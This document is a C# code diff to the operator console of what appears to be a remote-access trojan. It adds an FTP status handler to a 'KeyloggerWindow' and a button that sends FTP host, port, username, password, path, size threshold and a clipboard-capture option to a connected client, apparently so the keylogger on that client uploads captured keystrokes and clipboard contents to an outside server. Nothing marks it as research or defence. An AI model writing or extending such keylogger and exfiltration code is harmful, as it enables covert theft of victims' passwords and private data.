@@ -27,6 +27,7 @@ public partial class KeyloggerWindow : ThemedWindow
         _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
         _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
         _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);
+        _server.RegisterHandler(clientId, PacketType.KeyloggerFtpStatus,   OnFtpStatus);
         _server.ClientDisconnected += OnClientDisconnected;
 
         _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };
@@ -38,6 +39,7 @@ public partial class KeyloggerWindow : ThemedWindow
             _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
+            _server.UnregisterHandler(clientId, PacketType.KeyloggerFtpStatus);
             _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
             ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
@@ -162,7 +164,71 @@ public partial class KeyloggerWindow : ThemedWindow
         catch { }
     }
 
+    private void OnFtpStatus(Packet pkt)
+    {
+        try
+        {
+            var d = JsonConvert.DeserializeObject<KeyloggerFtpStatusData>(pkt.Data);
+            if (d == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                TxtFtpStatus.Text = d.Event switch
+                {
+                    "uploading" => $"⬆ Uploading {d.Filename}…",
+                    "uploaded"  => $"✓ Uploaded {d.Filename}",
+                    "retry"     => $"↻ Retry {d.Attempt}/3 — {d.Message}",
+                    "failed"    => $"✗ Failed: {d.Message}",
+                    _           => d.Event
+                };
+            });
+        }
+        catch { }
+    }
+
     // ── Button handlers ──────────────────────────────────────────────────────
+
+    private async void BtnFtpApply_Click(object s, RoutedEventArgs e)
+    {
+        var host    = TxtFtpHost.Text.Trim();
+        var portStr = TxtFtpPort.Text.Trim();
+        var user    = TxtFtpUser.Text.Trim();
+        var pass    = TxtFtpPass.Password;
+        var path    = TxtFtpPath.Text.Trim();
+        var sizeStr = TxtMaxSizeKb.Text.Trim();
+        var clip    = ChkClipboard.IsChecked == true;
+
+        if (string.IsNullOrEmpty(host))
+        { TxtFtpStatus.Text = "✗ Host is required"; return; }
+        if (!int.TryParse(portStr, out var port) || port < 1 || port > 65535)
+        { TxtFtpStatus.Text = "✗ Invalid port"; return; }
+        if (!int.TryParse(sizeStr, out var maxKb) || maxKb < 1)
+        { TxtFtpStatus.Text = "✗ Invalid max size"; return; }
+
+        try
+        {
+            var cfg = new KeyloggerFtpConfigData
+            {
+                FtpHost          = host,
+                FtpPort          = port,
+                FtpUser          = user,
+                FtpPass          = pass,
+                FtpPath          = string.IsNullOrEmpty(path) ? "/" : path,
+                MaxSizeKb        = maxKb,
+                ClipboardEnabled = clip
+            };
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerFtpConfig,
+                Data = JsonConvert.SerializeObject(cfg)
+            });
+            TxtFtpStatus.Text = $"Config applied — threshold {maxKb} KB";
+        }
+        catch (Exception ex)
+        {
+            TxtFtpStatus.Text = $"✗ Send failed: {ex.Message}";
+        }
+    }
 
     private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();
 
